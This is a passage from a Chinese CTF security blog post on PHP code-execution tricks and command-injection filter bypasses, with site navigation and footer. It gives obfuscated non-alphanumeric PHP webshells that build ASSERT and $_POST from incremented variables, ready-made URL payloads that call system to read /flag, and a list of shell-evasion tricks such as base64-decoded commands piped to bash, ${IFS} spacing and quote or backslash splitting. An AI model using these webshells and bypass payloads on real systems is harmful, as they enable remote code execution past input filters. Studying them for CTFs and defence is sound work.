class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSERT&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;   <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;P&quot;，此时$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;O&quot;，此时$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>强化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$____</span>;</span><br><span class="line">--<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=((_/_).<span class="string">&#x27;&#x27;</span>)&#123;<span class="variable">$__</span>&#125;;<span class="comment">//NAN</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$____</span>;<span class="comment">//O</span></span><br><span class="line">++<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$______</span>=<span class="variable">$____</span>;<span class="comment">//p</span></span><br><span class="line">++<span class="variable">$____</span>;++<span class="variable">$____</span>;++<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$_______</span>=<span class="variable">$____</span>;<span class="comment">//S</span></span><br><span class="line">++<span class="variable">$____</span>;</span><br><span class="line"><span class="variable">$________</span>=<span class="variable">$____</span>;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_________</span>=<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$_______</span>.<span class="variable">$________</span>;<span class="comment">//POST</span></span><br><span class="line"><span class="variable">$_________</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_________</span>;<span class="comment">//_POST</span></span><br><span class="line">$&#123;<span class="variable">$_________</span>&#125;&#123;_&#125;($&#123;<span class="variable">$_________</span>&#125;&#123;__&#125;);<span class="comment">//$_POST[_]($_POST[__])</span></span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">?cmd=<span class="variable">$__</span>=++<span class="variable">$____</span>;--</span><br><span class="line"><span class="variable">$__</span>;<span class="variable">$____</span>=((_/_).<span class="string">&#x27;&#x27;</span>)&#123;<span class="variable">$__</span>&#125;;<span class="variable">$_____</span>=++<span class="variable">$____</span>;++<span class="variable">$____</span>;<span class="variable">$______</span>=<span class="variable">$____</span>;++<span class="variable">$____</span>;++<span class="variable">$____</span>;++<span class="variable">$____</span>;<span class="variable">$___</span></span><br><span class="line">____=<span class="variable">$____</span>;++<span class="variable">$____</span>;<span class="variable">$________</span>=<span class="variable">$____</span>;<span class="variable">$_________</span>=<span class="variable">$______</span>.<span class="variable">$_____</span>.<span class="variable">$_______</span>.<span class="variable">$________</span>;<span class="variable">$_________</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string">_&#x27;</span>.<span class="variable">$_________</span>;$&#123;<span class="variable">$_________</span>&#125;&#123;_&#125;($&#123;<span class="variable">$_________</span>&#125;&#123;__&#125;);&amp;_=system&amp;__=cat /flag</span><br></pre></td></tr></table></figure>
+
+
+
+<p>究极强化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[_]; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//o</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]);<span class="comment">//$_POST[$_POST[__]] 注意。这里的__也可以替换成%FA这样的特殊字符减少一个字符占用</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="variable">$_</span>=(_/_._)[_];<span class="variable">$_</span>%<span class="number">2</span>B%<span class="number">2</span>B;$%FA=<span class="variable">$_</span>.<span class="variable">$_</span>%<span class="number">2</span>B%<span class="number">2</span>B;<span class="variable">$_</span>%<span class="number">2</span>B%<span class="number">2</span>B;<span class="variable">$_</span>%<span class="number">2</span>B%<span class="number">2</span>B;<span class="variable">$_</span>=_.$%FA.%<span class="number">2</span>B%<span class="number">2</span>B<span class="variable">$_</span>.%<span class="number">2</span>B%<span class="number">2</span>B<span class="variable">$_</span>;<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[%FA]);&amp;_=system&amp;%FA=cat /flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h2><blockquote>
+<p>a=c;b=at;c=flag;$a$b $c</p>
+</blockquote>
+<h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><p>cat flag  编码为  Y2F0IGZsYWc</p>
+<blockquote>
+<p>`echo “Y2F0IGZsYWc=”|base64 -d`</p>
+</blockquote>
+<blockquote>
+<p>echo “Y2F0IGZsYWc=”|base64 -d|bash</p>
+</blockquote>
+<h2 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h2><blockquote>
+<p>c””at flag</p>
+</blockquote>
+<blockquote>
+<p>c””at fl””ag</p>
+</blockquote>
+<blockquote>
+<p>c””at fl’’ag</p>
+</blockquote>
+<h2 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h2><blockquote>
+<p>c\at fl\ag</p>
+</blockquote>
+<h2 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h2><p>$IFS在linux下表示分隔符，单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个丹就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
+<blockquote>
+<p>cat${IFS}flag</p>
+</blockquote>
+<blockquote>
+<p>cat${IFS}$9flag</p>
+</blockquote>
+<blockquote>
+<p>cat$IFS$9flag</p>
+</blockquote>
+<h2 id="重定向符-lt-gt"><a href="#重定向符-lt-gt" class="headerlink" title="重定向符&lt;&gt;"></a>重定向符&lt;&gt;</h2><blockquote>
+<p>cat&lt;&gt;flag</p>
+</blockquote>
+<blockquote>
+<p>cat&lt;flag</p>
+</blockquote>
+<h2 id="利用已存在的资源"><a href="#利用已存在的资源" class="headerlink" title="利用已存在的资源"></a>利用已存在的资源</h2><p>从已有的文件或者环境变量中获得相应的字符。</p>
+<h2 id="管道符-amp-命令分隔符"><a href="#管道符-amp-命令分隔符" class="headerlink" title="管道符&amp;命令分隔符"></a>管道符&amp;命令分隔符</h2><blockquote>
+<p>1.==%Oa==符号换行符</p>
+<p>2.==%Od==符号回车符<br>3.==;==符号在shell中，担任”连续指令”功能的符号就是”分号”<br>4.==&amp;==符号&amp;放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;”实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息<br>5.==|==符号管道符左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示<br>6.==&amp;&amp;==表示前一条命令执行成功时，才执行后一条命令<br>7.==||==表示上一条命令执行失败后，才执行下一条命令</p>
+<p>8.命令终止符==%00%20#==</p>
+</blockquote>
+<blockquote>
+<p>多命令执行符              格式                        作用<br>  ;               命令1;命令2             不错的命令都会执行<br> &amp;&amp;               命令1&amp;&amp;命令2            逻辑与：当命令1正确执行后，命令2才会正确执行，否则命令2不会执行<br> ||               命令1||命令2            逻辑或：当命令1不正确执行后，命令2才会正确执行，否则命令2不会执行</p>
+</blockquote>
+<blockquote>
+<p>windows:</p>
+<p>| 前后两个都执行</p>
+<p>||  执行前面的，前面的错误就执行后面的</p>
+<p>&amp;&amp;  前面的执行完执行后面的</p>
+</blockquote>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/04/08/pickle/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>pickle</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/04/04/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      phar反序列化
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
